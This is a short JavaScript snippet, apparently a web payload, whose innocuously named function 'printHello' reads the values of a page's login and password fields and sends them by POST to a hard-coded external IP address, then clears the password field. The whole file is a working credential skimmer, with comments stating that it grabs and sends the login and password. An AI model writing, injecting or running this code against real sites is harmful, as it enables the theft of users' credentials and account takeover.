console.log("Hello!");


var my_ip = "http://52.207.249.93:8000";

function printHello() {
	// grab the login and pass
	var login = document.getElementById('login');
	var password = document.getElementById('password');
	// send the login and pass as resquests
	var req = new XMLHttpRequest();
	req.open( "POST", my_ip, false);
	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
    password.value = "";
}

